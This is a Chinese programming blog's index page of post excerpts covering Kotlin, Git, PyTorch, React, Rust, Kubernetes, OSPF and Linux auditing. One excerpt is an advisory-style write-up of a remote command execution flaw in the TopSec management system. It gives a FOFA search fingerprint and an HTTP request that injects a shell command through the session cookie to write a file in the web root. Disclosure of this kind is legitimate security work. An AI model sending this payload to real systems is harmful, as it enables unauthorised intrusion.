<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="菜鸟程序员博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="菜鸟程序员博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ea3cbe8874fd3f613676582440e974f7/" rel="bookmark">
			kotlin isEmpty/isNotEmpty/isNullOrEmpty和isBlank/isNotBlank/isNullOrBlank
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		kotlin 中
isEmpty ：如果判断的字符为空返回值返回true否则返回false
它的源码
@kotlin.internal.InlineOnly
public inline fun CharSequence.isEmpty(): Boolean = length == 0
length == 0: 首先检查字符序列的长度是否为 0。如果长度为 0，则表明这个字符序列不包含任何字符，因此被认为是空白的，直接返回 true，(符合java中空字符串的定义，一个长度为0的字符串)
isNotEmpty ：如果判断的字符不为空返回值返回true否则返回false
它的源码
@kotlin.internal.InlineOnly
public inline fun CharSequence.isNotEmpty(): Boolean = length &gt; 0
isNullOrEmpty ： 如果判断的字符为空或者null返回true否则返回false
它的源码
@kotlin.internal.InlineOnly
public inline fun CharSequence?.isNullOrEmpty(): Boolean {
contract {
returns(false) implies (this@isNullOrEmpty != null)
}
return this == null || this.length == 0
}
看下这个的打印值
val str1: String? = null Log.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ea3cbe8874fd3f613676582440e974f7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e9525ea2684d2c8de7d822ffdaaf31a9/" rel="bookmark">
			.gitignore文件的书写
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		.gitignore文件的书写 当编写 .gitignore 文件时，您可以根据需要列出要忽略的文件、文件夹或特定模式。以下是对一些常见用例进行分类，并提供相应的示例：
1. 忽略特定文件类型 # 忽略所有 .log 文件 *.log # 忽略所有 .zip 文件 *.zip 2. 忽略特定文件或文件夹 # 忽略单个文件 config.ini # 忽略整个文件夹 build/ 3. 忽略特定路径下的文件或文件夹 # 在根目录下的某个文件夹下忽略特定文件 assets/data.json # 在根目录下的某个文件夹下忽略整个文件夹 assets/images/ 4. 使用通配符和模式 # 忽略以 temp 开头的文件 temp* # 忽略所有 .txt 文件 *.txt # 忽略特定文件夹下的所有 .js 文件 assets/js/*.js 5. 忽略特定操作系统生成的文件 # 忽略 macOS Finder 生成的 .DS_Store 文件 .DS_Store # 忽略 Windows 系统生成的 Thumbs.db 文件 Thumbs.db 6. 忽略编译或构建生成的文件 # 忽略编译产生的文件夹 dist/ # 忽略构建过程中生成的文件 node_modules/ 7.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e9525ea2684d2c8de7d822ffdaaf31a9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1760bbf4d76d5432b77d1920ade01efd/" rel="bookmark">
			解释 Git 的基本概念和使用方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Git是一种分布式版本控制系统，可以跟踪和管理项目中的所有文件的修改和历史记录。
Git的基本概念包括：
仓库（Repository）：存储项目文件和相关历史记录的位置。可以是本地仓库（在本地计算机上）或远程仓库（在网络上的服务器上）。
分支（Branch）：是仓库中的一个独立线条，可以用于独立开发、实验和测试功能。常见的分支包括主分支（通常是“master”或“main”）和开发分支（用于开发新功能或修复错误）。
提交（Commit）：是对项目文件的一次更改的记录，包括修改的内容和作者的信息。每个提交都有一个唯一的标识符，用于跟踪和回溯历史更改。
远程仓库（Remote Repository）：是位于网络服务器上的一个仓库，用于与团队成员共享项目。可以在本地计算机上克隆远程仓库，以便进行开发和提交更改。
Git的使用方式包括：
初始化仓库：创建一个新的Git仓库，或将现有项目转换为Git仓库。
添加文件：将项目文件添加到Git仓库中，以便进行版本控制。
创建分支：创建新的分支来独立开发新功能或修复错误。
切换分支：在不同的分支之间切换，以便进行不同的开发或测试。
提交更改：将文件的更改提交到仓库，创建一个新的提交记录。
合并分支：将不同分支上的更改合并到一个分支中，保留所有修改。
追溯历史：查看和回溯项目的历史更改，以便了解每个提交的详细信息。
克隆仓库：从远程仓库中克隆一个副本到本地计算机上，以便进行开发和提交。
通过使用Git，开发团队可以更好地协作、追踪项目的状态、管理代码的版本，并轻松回滚任何更改。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/243d1d3ad2f2cd1734ee6e5c84537a2d/" rel="bookmark">
			autograd与逻辑回归
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、autograd—自动求导系统 torch.autograd.backward() torch.autograd.backward()是PyTorch中用于计算梯度的函数。以下是对该函数的参数的解释：
功能：自动求取梯度
• tensors: 用于求导的张量，如 loss
• retain_graph : 保存计算图
• create_graph : 创建导数计算图，用于高阶求导
• grad_tensors：多梯度权重
tensors：需要计算梯度的张量或张量的列表。这些张量的requires_grad属性必须为True。grad_tensors：可选参数，用于指定关于tensor的外部梯度。默认为None，表示使用默认的梯度为1。retain_graph：可选参数，用于指定是否保留计算图以供后续计算。默认为None，表示根据需要自动释放计算图。create_graph：可选参数，用于指定是否创建计算图以支持高阶梯度计算。默认为False，表示不创建计算图。 该函数的作用是计算tensors中张量的梯度，使用链式法则将梯度传播到叶子结点。它会自动构建计算图，并使用反向传播算法计算梯度。
当y = (x + w) * (w + 1)，a = x + w，b = w + 1，y = a * b时对于w的梯度的推导如下：
𝜕y/𝜕w = (𝜕y/𝜕a) * (𝜕a/𝜕w) + (𝜕y/𝜕b) * (𝜕b/𝜕w)
= b * 1 + a * 1
= b + a
= (w + 1) + (x + w)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/243d1d3ad2f2cd1734ee6e5c84537a2d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/201d2375aa030a53492b6384a268016a/" rel="bookmark">
			1394C-SJT05-T-RL AB罗克韦尔伺服控制器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1394C-SJT05-T-RL 是一款罗克韦尔伺服控制器，属于1394 Allen-Bradley运动控制系列。该控制器具有以下特点：
集成运动控制：1394C-SJT05-T-RL具有IMC S级（GMC turbo）集成运动控制，提供更多的GML内存并快速执行程序。高效电源转换：该控制器具有高效的IGBT电源转换，可确保稳定的电力供应。多种连接方式：1394C-SJT05-T-RL系统使用SLC或背板接口来传输I/O数据位，方便与其他设备进行连接。强大的驱动能力：该控制器最多可支持四个轴，节省了大量面板空间，同时具有高效的驱动能力。高效能表现：1394C-SJT05-T-RL是一个5千瓦控制器，峰值功率输出为28千瓦，效率高达99%。稳定的输入电压：该控制器可在360至480伏交流三相输入电源下提供直线连接，无需变压器，确保了稳定的电压输入。其他特性：此外，它还具有7.36安培的连续电流输出、15.0安培的间歇电流输出、20毫秒的线路损耗穿越和6.5安培的交流输入电流。同时具备滑动锁定功能和模块间连接系统，确保了使用的安全性和便利性。1394C-SJT05-T-RL is a Rockwell servo controller belonging to the 1394 Allen Bradley motion control series. This controller has the following characteristics:
Integrated motion control: 1394C-SJT05-T-RL features IMC S-level (GMC turbo) integrated motion control, providing more GML memory and fast program execution.
Efficient power conversion: This controller has efficient IGBT power conversion, ensuring stable power supply.
Multiple connection methods: The 1394C-SJT05-T-RL system uses SLC or backplane interfaces to transmit I/O data bits, making it convenient to connect with other devices.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/201d2375aa030a53492b6384a268016a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dcfd2b6706de54363a1b883aa459fa56/" rel="bookmark">
			html引入react以及hook的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		html引入react 效果代码注意 效果 分享react demo片段的时候，如果是整个工程项目就有点太麻烦了，打开速度慢，文件多且没必要，这个时候用html就很方便。
在html中能正常使用useState 和 useEffect 等hook。
代码 &lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;React App&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div id="root"&gt;&lt;/div&gt; &lt;script crossorigin src="https://unpkg.com/@babel/standalone/babel.min.js"&gt;&lt;/script&gt; &lt;script crossorigin src="https://unpkg.com/react@17/umd/react.production.min.js"&gt;&lt;/script&gt; &lt;script crossorigin src="https://unpkg.com/react-dom@17/umd/react-dom.production.min.js"&gt;&lt;/script&gt; &lt;script type="text/babel"&gt; function App() { const [count, setCount] = React.useState(0); React.useEffect(() =&gt; { console.log('Component is mounted'); return () =&gt; { console.log('Component will unmount'); }; }, []); return ( &lt;div&gt; &lt;h1&gt;Hello, React!&lt;/h1&gt; &lt;p&gt;This is a simple React component.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dcfd2b6706de54363a1b883aa459fa56/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7bbdb70841b061f14dadcac0735e23eb/" rel="bookmark">
			​iOS实时查看App运行日志
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、设备连接
二、使用克魔助手查看日志
三、过滤我们自己App的日志
📝 摘要： 本文介绍了如何在iOS iPhone设备上实时查看输出在console控制台的日志。通过克魔助手工具，我们可以连接手机并方便地筛选我们自己App的日志。
💬 引言： 在移动应用开发过程中，经常需要查看应用在运行时输出的日志信息。而在iOS上，我们可以通过克魔助手提供的功能来实现方便快捷地查看设备上的日志。本文将介绍如何使用克魔助手来实时查看iOS设备上的应用日志。
一、设备连接 首先，我们需要在电脑上安装克魔助手，并将iPhone设备连接到电脑上。打开克魔助手并点击连接设备按钮，即可完成设备连接。连接成功后，我们可以在克魔助手的界面上看到该设备上正在运行的进程列表。
​
二、使用克魔助手查看日志 在克魔助手的界面上，我们可以直接查看设备上输出的日志信息。默认情况下，所有进程的日志都会显示在日志列表中。如果我们只想查看我们自己App的日志，可以使用过滤功能。
​
三、过滤我们自己App的日志 为了方便筛选我们自己App的日志，我们可以在日志列表中选中一条我们的日志，在进程名称上右键，选择“显示进程名”即可只显示我们App的日志信息。
此外，如果列表中没有显示进程名的列，我们可以在其他列名上使用 command+ 空格 快捷键，搜索应用，并勾选上进程名称。然后点击“开始日志”，即可只显示我们App的日志信息。
​
​
📝 总结： 通过本文的介绍，我们了解了如何使用克魔助手来实时查看iOS设备上的应用日志。克魔助手提供了方便的界面和过滤功能，使我们能够更加便捷地进行日志查看和调试工作。
以上，按照个人习惯来选择工具即可。
​
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ab99ded1a252f8dad7e0988f017a1d08/" rel="bookmark">
			数字化制造安全防线：迅软DSE助力通用设备企业终端安全卫士
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		客户简要介绍
某公司是一家主要生产新型激光打印机、喷墨打印机、其它打印机、精密多功能机、传真机等办公自动化用品的企业。公司与顾客建立长期的信赖忠诚关系”的方针，逐步完善公司的各项运营，不断扩充市场前景。产品除国内销售外，还销往欧美、日本等国家，取得了令人瞩目的成绩。
企业的核心诉求
员工频繁使用私人U盘、聊天工具、邮件等将公司制造的新型设备图纸和资料外传出去，存在泄密风险
车间员工在上班时间经常访问各类购物、炒股和游戏网站，导致工作效率低
员工经常从互联网下载各类软件安装，部分软件安装包携带病毒木马，导致公司电脑出现蓝屏死机
员工使用手机拍照、软件截图打印等方式获取公司核心数据外传出去，公司缺少相应的管控手段
公司需要定期审计员工电脑文档操作及外传情况，当前缺少相应的审计手段
公司电脑数量多且分布较广，运维人员进行资产盘点、补丁检测、远程维护等工作量大
解决方案
迅软DSE规范终端操作行为
员工电脑禁止接入私人U盘，仅允许使用公司注册验证的U盘接入拷贝数据
员工电脑禁止使用聊天工具发送文件，仅允许使用公司规定的聊天工具对外发送文件
员工电脑禁止使用私人邮箱发送邮件，仅允许使用公司企业邮箱对外发送邮件和附件
员工电脑上班时间禁止访问各类购物、炒股和游戏网址，下班时间放开限制可以正常访问
员工电脑禁止随意安装软件，统一使用公司软件中心进行软件安装、升级和卸载，避免随意安装导致电脑异常
迅软DSE审计终端操作行为
针对员工电脑启用屏幕浮水印和打印浮水印，水印信息包含计算机名、用户名、日期、时间、IP/Mac地址等，通过水印信息可以第一时间审计到泄密源，震慑员工随意拍照截图的行为
针对员工电脑文档操作全生命周期进行记录，包含创建、编辑、复制、移动、删除、重命名、上传等行为，并生成统计报表，以便公司审计人员及时发现员工违规行为
迅软DSE提高运维工作效率
统计公司终端电脑的软件和硬件信息，并记录软件硬件变更情况，及时掌握终端电脑的实时信息
自动检测终端电脑补丁更新情况，及时安装最新系统补丁，修复高危系统漏洞
提供远程协助工具，供运维人员第一时间远程终端电脑进行问题故障排查，及时处理用户电脑故障
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5ce3c746e0cac14e945ba3d0bc4c5839/" rel="bookmark">
			sklearn.feature_selection.SelectFromModel利用模型筛选特征
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		sklearn.feature_selection.SelectFromModel模型筛选特征 以随机森林为例，查看随机森林之类的模型使用的特征。有两种使用方式：
1， 使用未训练的模型 from sklearn.feature_selection import SelectFromModel from sklearn.ensemble import RandomForestClassifier X = [[ 0.87, -1.34, 0.31 ], [-2.79, -0.02, -0.85 ], [-1.34, -0.48, -2.55 ], [ 1.92, 1.48, 0.65 ]] y = [0, 1, 0, 1] # 输入参数包括estimator, threshold:筛选阈值， prefit=False:是否训练过，max_features:最大特征数 selector = SelectFromModel(estimator=LogisticRegression(), threshold=0.5).fit(X, y) # 筛选的特征的阈值 selector.threshold_ # 0.5 # 特征支持的布尔表 selector.get_support() # array([False, True, False]) # 对输入进行特征筛选 X_new = selector.transform(X) # 查看筛选出的特征名称,需要给出特征的名称列表，如果是pandas，就可以输入x.columns selector.get_feature_names_out(['a', 'b', 'c']) # ['b'] 2, 使用训练模型 from sklearn.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5ce3c746e0cac14e945ba3d0bc4c5839/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fdfc0b31629658319df2caade413a7a9/" rel="bookmark">
			Rust 注释规则
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		单行注释 单行注释有两种 // 和 /// 。
其中 /// 用在文档的头部，作为文档的一部分。
// 可以用在任何部分。
多行注释
/* */。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d2dd14c14e89f29c1bf30ddf77c8347f/" rel="bookmark">
			Rust 圣经 阅读 引用与借用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Rust 通过 借用（Borrowing） 在使用某个变量的指针或引用。
获取变量的引用，称之为 借用（borrowing） 。
引用与解引用 引用是为了解决在使用函数时，频繁地传递所有权。
引用只是获取了引用权，而不是获取所有权。
fn main() { let s = String::from("Hello"); let s1 = &amp;s; // 不可变引用 let s2 = &amp;mut 2; // 可变引用 /* 这个程序不能编译通过。 因为不能同时存在 可变引用 和 不可变引用。 */ } 引用与变量一样，也是默认为不可变。
不仅是原来的变量是可变就可以，必须是引用也是可变的，即在使用let s1 = &amp;mut s 或传递参数 &amp;mut s。
fn main() { let mut s = String::from("hello, "); push_str(&amp;mut s) } fn push_str(s: &amp;mut String) { s.push_str("world") } 解引用
fn main() { let s = String::from("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d2dd14c14e89f29c1bf30ddf77c8347f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/65a1410012c4e126d2eaa559a933025c/" rel="bookmark">
			【K8S 资源管理】声明式资源管理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、常用的发布方式
1、蓝绿发布：
2、金丝雀发布（灰度发布）：
3、滚动更新（deployment的默认更新方式）：
二、声明式管理方法（yaml文件）
1、三种发布命令：
2、三种常用的yaml文件：
2.1、deployment的yaml文件：
2.2、service的yaml文件：
2.3、port的yaml文件：
一、常用的发布方式 三种常见的项目发布方式：
蓝绿发布、金丝雀发布（灰度发布）、滚动发布
应用程序升级，面临的最大的问题是新旧业务之间的切换。
立项—定稿—需求发布—开发—测试—发布
测试之后上线，在完美也会有问题。为了不让发生的问题影响所有用户，产生了上述的三种发布方式
1、蓝绿发布： 工作方式：
1、把应用服务集群标记为两个组，蓝组和绿组。先升级蓝组，要把蓝组从负载均衡当中移除，绿组继续提供服务
2、蓝组升级完毕，再把绿组从负载均衡中移除，绿组升级，然后都加入回负载均衡中去，完成对外服务
蓝绿发布对硬件资源要求很高，但是有了云计算和微服务，现在的成本也大大降低了
蓝绿发布的特点：
一旦出现问题，问题的影响范围很大发布策略简单基于现在的云计算和微服务，用户是无感知的升级和回滚都比较方便 缺点：
在发布升级的过程中，只有一部分集群在对外提供服务，可能会使集群的负载能力下降，响应变慢，需要注意给这个集群增加负载能力（一般来说没什么特殊需要，一般都是半夜访问最小的之后升级）。在短时间内可能会浪费一定的资源成本
2、金丝雀发布（灰度发布）： 必须是基于deployment控制器创建的服务，才可以使用这种发布方式。相当于测试服
工作方式：
实际上也是一种滚动更新，发布的过程中，暂时停止，只有一部分的pod先升级，其他的pod还是处于老的版本。只有一部分用户可以访问新的版本，绝大多数用户还是老版本。确定无问题之后，再把剩下的老版本升级成新版本，把暂停取消，继续发布。如果有问题，可以立即回滚。暂停不是回滚，一旦取消暂停，只能全部升级完毕之后再回滚
#K8S的金丝雀暂停发布，只会更新一个 kubectl set image deployment nginx nginx=nginx:1.24 --record &amp;&amp; kubectl rollout pause deployment nginx #统一更新 kubectl rollout resume deployment nginx #全部升级完毕后才能回滚 kubectl rollout history deployment nginx kubectl rollout undo deployment nginx --to-revision=1 若想回滚，只能全部升级完毕之后，才能回滚
灰度发布特点：
自动化的要求比较高，对运维人员的要求比较高方便发现问题，及时解决，影响范围比较小用户无感知，可以实现一个平滑的过度。节约资源发布策略比较复杂不易回滚，必须等到全部发布成功之后，才能回滚 3、滚动更新（deployment的默认更新方式）： deployment的默认更新方式
一般灰度和滚动发布即可
一般用滚动，特殊场景用灰度（要准备场景）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/65a1410012c4e126d2eaa559a933025c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b1704635ea51e486e58f94967abc8a0b/" rel="bookmark">
			华为HarmonyOS 开发工具DevEco Studio 下载安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、系统定位 HarmonyOS是一款面向万物互联时代的、全新的分布式操作系统。
在传统的单设备系统能力基础上，HarmonyOS提出了基于同一套系统能力、适配多种终端形态的分布式理念，能够支持手机、平板、智能穿戴、智慧屏、车机、PC、智能音箱、耳机、AR/VR眼镜等多种终端设备，提供全场景（移动办公、运动健康、社交通信、媒体娱乐等）业务能力。
HarmonyOS有三大特征：
搭载该操作系统的设备在系统层面融为一体、形成超级终端，让设备的硬件能力可以弹性扩展，实现设备之间硬件互助，资源共享。
对消费者而言，HarmonyOS能够将生活场景中的各类终端进行能力整合，实现不同终端设备之间的快速连接、能力互助、资源共享，匹配合适的设备、提供流畅的全场景体验。面向开发者，实现一次开发，多端部署。
对应用开发者而言，HarmonyOS采用了多种分布式技术，使应用开发与不同终端设备的形态差异无关，从而让开发者能够聚焦上层业务逻辑，更加便捷、高效地开发应用。一套操作系统可以满足不同能力的设备需求，实现统一OS，弹性部署。
对设备开发者而言，HarmonyOS采用了组件化的设计方案，可根据设备的资源能力和业务特征灵活裁剪，满足不同形态终端设备对操作系统的要求。 HarmonyOS提供了支持多种开发语言的API，供开发者进行应用开发。支持的开发语言包括ArkTS、JS（JavaScript）、C/C++ 、Java。
二、下载安装 官网地址：https://developer.harmonyos.com/cn/develop/deveco-studio/
选择对应版本进行下载
下载后解压缩，运行exe文件
傻瓜式安装，一路Next，注意安装路径
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/12e5683ec1fed07f3d4f05cecfb1fc17/" rel="bookmark">
			天融信TOPSEC安全管理系统存在远程命令执行漏洞
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 产品简介漏洞概述指纹识别漏洞利用修复建议 产品简介 天融信TopSec 安全管理系统，是基于大数据架构，采用多种技术手段收集各类探针设备安全数据，围绕资产、漏洞、攻击、威胁等安全要素进行全面分析，提供统一监测告警、集中策略管控、协同处置流程，实现客户等保合规、资产统一管理、风险一键阻断等。
漏洞概述 安全管理系统存在存在远程命令执行漏洞，通过此漏洞，攻击者可进行文件写入等危险操作，威胁系统安全。
指纹识别 fofa:
title="Web User Login" &amp;&amp; body="/cgi/maincgi.cgi?Url=VerifyCode" 漏洞利用 poc:
GET /cgi/maincgi.cgi?Url=check HTTP/1.1 Host: 10 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0 Cookie: session_id_443=1|echo 'hhh' &gt;&gt; /www/htdocs/site/image/hhh.txt; Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Dnt: 1 Upgrade-Insecure-Requests: 1 Connection: close 验证url:
https://you_ip/site/image/hhh.txt 修复建议 联系软件厂商更新至最新安全版本
【陆上行舟。】
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3c169d797258a143c76ad1a997ad29fc/" rel="bookmark">
			​LeetCode解法汇总1276. 不浪费原料的汉堡制作方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录链接： 力扣编程题-解法汇总_分享+记录-CSDN博客 GitHub同步刷题项目： https://github.com/September26/java-algorithms
原题链接：力扣（LeetCode）官网 - 全球极客挚爱的技术成长平台 描述： 圣诞活动预热开始啦，汉堡店推出了全新的汉堡套餐。为了避免浪费原料，请你帮他们制定合适的制作计划。
给你两个整数 tomatoSlices 和 cheeseSlices，分别表示番茄片和奶酪片的数目。不同汉堡的原料搭配如下：
巨无霸汉堡：4 片番茄和 1 片奶酪小皇堡：2 片番茄和 1 片奶酪 请你以 [total_jumbo, total_small]（[巨无霸汉堡总数，小皇堡总数]）的格式返回恰当的制作方案，使得剩下的番茄片 tomatoSlices 和奶酪片 cheeseSlices 的数量都是 0。
如果无法使剩下的番茄片 tomatoSlices 和奶酪片 cheeseSlices 的数量为 0，就请返回 []。
示例 1：
输入：tomatoSlices = 16, cheeseSlices = 7 输出：[1,6] 解释：制作 1 个巨无霸汉堡和 6 个小皇堡需要 4*1 + 2*6 = 16 片番茄和 1 + 6 = 7 片奶酪。不会剩下原料。 示例 2：
输入：tomatoSlices = 17, cheeseSlices = 4 输出：[] 解释：只制作小皇堡和巨无霸汉堡无法用光全部原料。 示例 3：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3c169d797258a143c76ad1a997ad29fc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b739f05a433612ca43337c151870d754/" rel="bookmark">
			实验4.4 动态路由OSPF协议的配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		实验4.4 动态路由OSPF协议的配置 一、任务描述二、任务分析三、具体要求四、实验拓扑五、任务实施1.配置交换机和路由器的接口的IP地址等参数。2.配置动态路由OSPF协议，实现全网互通。 六、任务验收七、任务小结八、知识链接1．OSPF协议概念2．OSPF协议区域3．链路状态及链路状态通告 一、任务描述 某公司的业务规模逐渐扩大，网络中路由器的数量也逐渐增多，已经达到了8台。经过测试，该公司的网络管理员发现原有的路由协议已经不再适合现有公司的应用，因此，决定在公司的路由器之间使用动态路由OSPF协议，实现网络的互联。
二、任务分析 由于公司的网络规模越来越大，网络管理员发现使用动态路由OSPF协议比较合适，因为动态路由OSPF协议可以实现快速收敛，并且出现环路的可能性不大，适合中型和大型企业网络。
三、具体要求 （1）添加3台计算机，将标签名分别更改为PC1、PC2和PC3。
（2）添加两台型号为AR2220的路由器，将标签名分别更改为RA和RB，路由器的名称分别设置为RA和RB。
（3）为RA和RB添加2SA模块，并添加在S 1/0/0接口位置。
（4）添加1台型号为S5700-28C-HI的交换机，标签名为SW3A，将交换机的名称设置为SW3A。
（5）PC1连接SW3A的GE 0/0/1接口，PC2连接SW3A的GE 0/0/2接口，PC3连接RB的GE 0/0/0接口，SW3A的GE 0/0/24接口连接RA的GE 0/0/0接口，RA的S 1/0/0接口连接RB的S 1/0/0接口。
（6）开启所有的交换机、路由器和计算机。
（7）路由器和交换机的接口及IP地址等。
（8）根据拓扑图，使用直通线连接好所有计算机。设置每台计算机的IP地址、子网掩码和网关。
（9）在两台路由器和1台交换机之间添加动态路由OSPF协议，实现全网互通。
四、实验拓扑 五、任务实施 1.配置交换机和路由器的接口的IP地址等参数。 （1）RA的基本配置。
&lt;Huawei&gt;sys Enter system view, return user view with Ctrl+Z. [Huawei]sys RA [RA]int g0/0/0 [RA-GigabitEthernet0/0/0]ip add 192.168.1.2 24 [RA-GigabitEthernet0/0/0]quit [RA]int s1/0/0 [RA-Serial1/0/0]ip add 192.168.2.1 24 [RA-Serial1/0/0]quit （2）RB的基本配置。
&lt;Huawei&gt;sys Enter system view, return user view with Ctrl+Z. [Huawei]sys RB [RB]int s1/0/0 [RB-Serial1/0/0]ip add 192.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b739f05a433612ca43337c151870d754/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/10eb4d6722eb251b54b04c08cd764db0/" rel="bookmark">
			【操作系统】安全审计-audit
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、audit简介二、开启auditd服务三、相关文件3.1应用配置文件 四、审计规则五、审计日志查询及分析附录1：auditctl -h附录2：systemcall 类型 参考文章：
1、安全-linux audit审计使用入门
2、audit详细使用配置
3、Linux-有哪些常见的System Call？
写在前面：
1.写博客，做日常工作记录，好记性不如烂笔头嘛；
2.内容非原创，参考的文章已上文列出；
3.如有错误，欢迎指正。
一、audit简介 audit是Linux内核提供的一种审计机制，由于audit是内核提供的，因此，在使用audit的过程中就包含内核空间和用户空间部分：
auditctl：用户态程序，用于审计规则配置和配置变更
kaudit：内核空间程序，根据配置好的审计规则记录发生的事件
auditd：用户态程序，通过netlink获取审计日志
通常的使用流程
用户通过auditctl配置审计规则
内核的kauditd程序获取到审计规则后，记录对应的审计日志
用户态的auditd获取审计日志并写入日志文件
二、开启auditd服务 systemctl status auditd.service systemctl start auditd.service 三、相关文件 # 1.应用配置文件 /etc/audit/auditd.conf # 2.添加规则的文件 /etc/audit/rules.d/audit.rules # 3.日志所在目录 /var/log/audit/ 3.1应用配置文件 举例：
